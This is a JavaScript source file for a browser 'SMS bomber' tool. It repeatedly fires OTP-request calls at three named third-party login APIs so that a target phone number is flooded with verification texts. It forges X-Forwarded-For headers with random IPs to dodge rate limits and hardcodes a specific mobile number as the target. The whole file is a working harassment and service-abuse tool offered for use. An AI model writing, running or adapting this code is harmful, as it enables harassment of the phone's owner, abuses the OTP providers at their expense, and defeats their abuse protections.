// ===== CONFIG =====
const REQUESTS = [
    {
        name: "Pansho OTP",
        url: "https://pansho.com/customer/auth/login",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        body: (phone) => `_token=DUMMY_TOKEN&login_type=otp-login&phone=${phone}&country_code=91`,
        phones: ["9729480795", "+919729480795", "919729480795"]
    },
    {
        name: "Apitxt OTP",
        url: "https://apitxt.com/api/auth/login/request-otp",
        method: "POST",
        headers: {"Accept": "application/json", "Content-Type": "application/json"},
        body: (phone) => JSON.stringify({
            country_code: "91",
            mobile_no: phone.replace('+91','').replace('91',''),
            channel: "sms"
        }),
        phones: ["9729480795", "919729480795", "09729480795"]
    },
    {
        name: "Testbook OTP",
        url: "https://api.testbook.com/api/v2/otp/send?emailOrMobile={phone}&resend=true",
        method: "POST",
        headers: {"Accept": "application/json", "Content-Type": "application/json", "X-Tb-Client": "web,1.3"},
        body: () => JSON.stringify({}),
        phones: ["9729480795", "+919729480795", "919729480795"]
    }
];

// ===== STATE =====
let running = false;
let stopRequested = false;
let stats = { total: 0, success: 0, failed: 0 };
let startTime = 0;
let reqCounter = 0;
let speedInterval = null;

// ===== DOM REFS =====
const $ = id => document.getElementById(id);
const totalCount = $('totalCount');
const successCount = $('successCount');
const failedCount = $('failedCount');
const statusDot = $('statusDot');
const statusText = $('statusText');
const speedDisplay = $('speedDisplay');
const logBox = $('logBox');
const startBtn = $('startBtn');
const stopBtn = $('stopBtn');
const targetPhone = $('targetPhone');

// ===== LOGGING =====
function addLog(msg, type = 'info') {
    const entry = document.createElement('div');
    entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
    entry.className = `log-${type}`;
    logBox.prepend(entry);
    if (logBox.children.length > 100) logBox.removeChild(logBox.lastChild);
}

// ===== STATS UPDATE =====
function updateStats() {
    totalCount.textContent = stats.total;
    successCount.textContent = stats.success;
    failedCount.textContent = stats.failed;
}

function updateStatus(state) {
    if (state === 'running') {
        statusDot.className = 'status-dot running';
        statusText.textContent = 'Running';
        statusText.style.color = '#00cc44';
        startBtn.style.display = 'none';
        stopBtn.style.display = 'block';
        startBtn.disabled = true;
    } else {
        statusDot.className = 'status-dot stopped';
        statusText.textContent = 'Stopped';
        statusText.style.color = '#1a1a2e';
        startBtn.style.display = 'block';
        stopBtn.style.display = 'none';
        startBtn.disabled = false;
        if (speedInterval) {
            clearInterval(speedInterval);
            speedInterval = null;
            speedDisplay.textContent = '0 req/sec';
        }
    }
}

// ===== SEND REQUEST =====
async function sendRequest(req, phone) {
    try {
        const url = req.url.replace(/\{phone\}/g, phone);
        const headers = { ...req.headers };
        headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';
        headers['X-Forwarded-For'] = `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
        
        let body = req.body(phone);
        
        const resp = await fetch(url, {
            method: req.method,
            headers: headers,
            body: body,
            cache: 'no-cache'
        });
        
        return resp.status;
    } catch (e) {
        return 0;
    }
}

// ===== WORKER LOOP =====
async function workerLoop(req, phone) {
    while (!stopRequested && running) {
        const variants = req.phones || [phone];
        const targetPhone = variants[Math.floor(Math.random() * variants.length)];
        const status = await sendRequest(req, targetPhone);
        
        stats.total++;
        reqCounter++;
        if (status === 200 || status === 302 || status === 201 || status === 202) {
            stats.success++;
            addLog(`✅ ${req.name} | ${targetPhone} | ${status}`, 'success');
        } else {
            stats.failed++;
            addLog(`❌ ${req.name} | ${targetPhone} | ${status}`, 'fail');
        }
        updateStats();
        
        // Small delay to avoid hammering
        await new Promise(r => setTimeout(r, 50));
    }
}

// ===== START BOMBING =====
async function startBomb() {
    const phone = targetPhone.value.trim();
    if (!phone) {
        alert('📱 Enter a phone number!');
        return;
    }
    if (running) return;
    
    // Reset
    stopRequested = false;
    running = true;
    stats = { total: 0, success: 0, failed: 0 };
    reqCounter = 0;
    startTime = Date.now();
    updateStats();
    updateStatus('running');
    addLog(`🚀 Bombing started on ${phone}`, 'info');
    
    // Speed tracker
    if (speedInterval) clearInterval(speedInterval);
    speedInterval = setInterval(() => {
        const elapsed = (Date.now() - startTime) / 1000;
        const speed = elapsed > 0 ? Math.round(reqCounter / elapsed) : 0;
        speedDisplay.textContent = `${speed} req/sec`;
    }, 1000);
    
    // Run all request types in parallel
    const workers = REQUESTS.map(req => workerLoop(req, phone));
    await Promise.all(workers);
    
    // If not stopped by user, auto-stop
    if (running && !stopRequested) {
        running = false;
        updateStatus('stopped');
        addLog(`⏹️ Bombing completed (all workers finished)`, 'info');
    }
}

// ===== STOP BOMBING =====
function stopBomb() {
    if (!running) return;
    stopRequested = true;
    running = false;
    updateStatus('stopped');
    addLog(`⏹️ Stopped by user`, 'info');
    if (speedInterval) {
        clearInterval(speedInterval);
        speedInterval = null;
        speedDisplay.textContent = '0 req/sec';
    }
}

// ===== KEYBOARD SHORTCUT: Enter to start =====
targetPhone.addEventListener('keydown', (e) => {
    if (e.key === 'Enter' && !startBtn.disabled) {
        startBomb();
    }
});
